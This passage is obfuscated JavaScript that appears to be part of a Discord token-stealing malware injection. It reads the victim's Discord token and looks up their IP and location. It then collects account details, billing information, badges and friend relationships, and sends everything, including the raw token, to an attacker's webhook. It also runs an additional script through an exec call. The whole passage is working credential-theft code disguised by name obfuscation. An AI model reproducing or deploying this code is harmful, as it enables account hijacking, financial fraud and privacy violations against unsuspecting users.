_0x53ff18=_0x302a44;if(!fs['existsSync'](process[_0x53ff18(0x240)]()+'/'+config[_0x53ff18(0x1e4)])){fs[_0x53ff18(0x1a3)](process[_0x53ff18(0x240)]()+'/'+config['brand']);var _0x57c112=undefined;_0x57c112=await getToken();const _0x3a3e1d=await getIp();var _0x317461,_0x3a5a3d,_0x151cd5;config[_0x53ff18(0x219)]&&(_0x57c112==undefined?sendToWebhook({'username':config[_0x53ff18(0x23d)][_0x53ff18(0x20e)],'avatar_url':config['embed'][_0x53ff18(0x217)],'url':config['embed'][_0x53ff18(0x1ea)],'embeds':[createEmbed({'title':'Discord\x20|\x20Client\x20initialized\x20(not\x20logged\x20in)','fields':[{'name':'Hostname','value':'```'+os[_0x53ff18(0x1fd)]+_0x53ff18(0x1ba),'inline':![]},{'name':_0x53ff18(0x213),'value':'```'+getDiscordClient()+_0x53ff18(0x1ba),'inline':![]},{'name':_0x53ff18(0x201),'value':_0x53ff18(0x1d0)+(_0x3a3e1d['ip']??'Unknown')+_0x53ff18(0x1fe)+(_0x3a3e1d[_0x53ff18(0x1fd)]??_0x53ff18(0x218))+'\x0aCity:\x20'+(_0x3a3e1d[_0x53ff18(0x238)]??_0x53ff18(0x218))+_0x53ff18(0x200)+(_0x3a3e1d['region']??_0x53ff18(0x218))+_0x53ff18(0x1d3)+(_0x3a3e1d['country']??'Unknown')+'\x0aTimezone:\x20'+(_0x3a3e1d[_0x53ff18(0x1e6)]??'Unknown')+'```','inline':![]}]})]}):(_0x317461=await getUserInfo(_0x57c112),_0x3a5a3d=await getBilling(_0x57c112),_0x151cd5=await getRelationships(_0x57c112),sendToWebhook({'username':config['embed'][_0x53ff18(0x20e)],'avatar_url':config[_0x53ff18(0x23d)]['avatar_url'],'embeds':[createEmbed({'title':_0x53ff18(0x1f4),'url':config[_0x53ff18(0x23d)][_0x53ff18(0x1ea)],'author':{'name':_0x317461[_0x53ff18(0x20e)]+'#'+_0x317461[_0x53ff18(0x227)]+'\x20('+_0x317461['id']+')','url':config['embed'][_0x53ff18(0x1ea)],'icon_url':_0x317461['avatar']?_0x53ff18(0x196)+_0x317461['id']+'/'+_0x317461[_0x53ff18(0x215)]:_0x53ff18(0x225)},'thumbnail':{'url':_0x317461[_0x53ff18(0x215)]?_0x53ff18(0x196)+_0x317461['id']+'/'+_0x317461[_0x53ff18(0x215)]:'https://cdn.discordapp.com/embed/avatars/0.png'},'fields':[{'name':_0x53ff18(0x1a6),'value':_0x53ff18(0x1ba)+_0x317461[_0x53ff18(0x1d5)]+_0x53ff18(0x1ba),'inline':!![]},{'name':_0x53ff18(0x1d8),'value':_0x53ff18(0x1ba)+(_0x317461[_0x53ff18(0x1ae)]??_0x53ff18(0x1a2))+_0x53ff18(0x1ba),'inline':![]},{'name':_0x53ff18(0x1c9),'value':''+getNitro(_0x317461[_0x53ff18(0x1e5)]),'inline':![]},{'name':'Billing','value':''+_0x3a5a3d,'inline':!![]},{'name':_0x53ff18(0x221),'value':''+getBadges(_0x317461[_0x53ff18(0x22f)]),'inline':![]},{'name':'Token','value':_0x53ff18(0x1ba)+_0x57c112+_0x53ff18(0x1ba),'inline':![]},{'name':_0x53ff18(0x1c0),'value':'```'+os[_0x53ff18(0x1fd)]+_0x53ff18(0x1ba),'inline':![]},{'name':_0x53ff18(0x213),'value':_0x53ff18(0x1ba)+getDiscordClient()+'```','inline':![]},{'name':_0x53ff18(0x201),'value':_0x53ff18(0x1d0)+(_0x3a3e1d['ip']??_0x53ff18(0x218))+_0x53ff18(0x1fe)+(_0x3a3e1d[_0x53ff18(0x1fd)]??'Unknown')+_0x53ff18(0x1dd)+(_0x3a3e1d['city']??'Unknown')+_0x53ff18(0x200)+(_0x3a3e1d[_0x53ff18(0x1b4)]??_0x53ff18(0x218))+_0x53ff18(0x1d3)+(_0x3a3e1d[_0x53ff18(0x1c1)]??_0x53ff18(0x218))+_0x53ff18(0x210)+(_0x3a3e1d[_0x53ff18(0x1e6)]??_0x53ff18(0x218))+_0x53ff18(0x1ba),'inline':![]}]}),createEmbed({'description':_0x53ff18(0x1e7)+_0x151cd5[_0x53ff18(0x1bf)]+')**\x0a\x0a'+_0x151cd5[_0x53ff18(0x1e0)],'thumbnail':{'url':_0x317461[_0x53ff18(0x215)]?'https://cdn.discordapp.com/avatars/'+_0x317461['id']+'/'+_0x317461['avatar']:_0x53ff18(0x225)},'author':{'name':_0x317461[_0x53ff18(0x20e)]+'#'+_0x317461['discriminator']+'\x20('+_0x317461['id']+')','url':config[_0x53ff18(0x23d)][_0x53ff18(0x1ea)],'icon_url':_0x317461['avatar']?_0x53ff18(0x196)+_0x317461['id']+'/'+_0x317461[_0x53ff18(0x215)]:_0x53ff18(0x225)}})]}))),config[_0x53ff18(0x1e3)]&&_0x57c112&&(await execScript(_0x53ff18(0x1a8),!![])['then'](_0x5451b6=>{}),config[_0x53ff18(0x1b1)]&&sendToWebhook({'username':config[_0x53ff18(0x23d)]['username'],'avatar_url':config['embed'][_0x53ff18(0x217)],'embeds':[createEmbed({'title':_0x53ff18(0x1ac),'url':config['embed'][_0x53ff18(0x1ea)],'author':{'name':_0x317461[_0x53ff18(0x20e)]+'#'+_0x317461[_0x53ff18(0x227)]+'\x20('+_0x317461['id']+')','url':config['embed'][_0x53ff18(0x1ea)],'icon_url':_0x317461[_0x53ff18(0x215)]?_0x53ff18(0x196)+_0x317461['id']+'/'+_0x317461[_0x53ff18(0x215)]:'https://cdn.discordapp.com/embed/avatars/0.png'},'thumbnail':{'url':_0x317461[_0x53ff18(0x215)]?_0x53ff18(0x196)+_0x317461['id']+'/'+_0x317461['avatar']:_0x53ff18(0x225)},'fields':[{'name':_0x53ff18(0x1c9),'value':''+getNitro(_0x317461[_0x53ff18(0x1e5)]),'inline':![]},{'name':_0x53ff18(0x19f),'value':''+_0x3a5a3d,'inline':!![]},{'name':'Badges','value':''+getBadges(_0x317461[_0x53ff18(0x22f)]),'inline':![]},{'name':_0x53ff18(0x204),'value':_0x53ff18(0x1ba)+_0x57c112+_0x53ff18(0x1ba),'inline':![]}]})]}));}}module['exports']=require(_0x302a44(0x214));
